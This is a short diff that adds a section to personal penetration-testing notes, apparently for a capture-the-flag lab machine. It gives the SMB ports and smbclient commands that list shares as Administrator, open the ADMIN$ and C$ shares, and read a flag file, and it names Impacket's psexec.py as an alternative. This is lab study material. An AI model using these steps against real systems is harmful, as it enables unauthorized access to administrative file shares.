@@ -93,6 +93,34 @@ ip a | grep tun0 -- saber la ip de la vpn del kali linux
 
 *********************************
 
+SMB cliente attack
+
+port 135 RPC
+port 139 Netbios
+port 445 SMB
+
+#sudo apt install smbclient
+#smbclient
+#smbclient -L target_ip -U Administrator -- in order to list the various available shares ( -L ) and to attempt a login as the Administrator accounT
+└──╼ [★]$ smbclient -L 10.129.123.161 -U Administrator
+
+
+ smbclient \\\\10.129.123.161\\ADMIN$ -U Administrator  -- DAR ENTER
+  smbclient \\\\10.129.123.161\\C$ -U Administrator
+  cd Users/Administrator/Desktop
+  cat flag.txt
+ 
+ 
+---Opcion 2
+ PSexec.py from Impacket, involving Impacket installation and common attack surface, big
+ fingerprinting.
+ 
+ 
+*****************************
+
+
+ 
 
 
 ********************
+ 
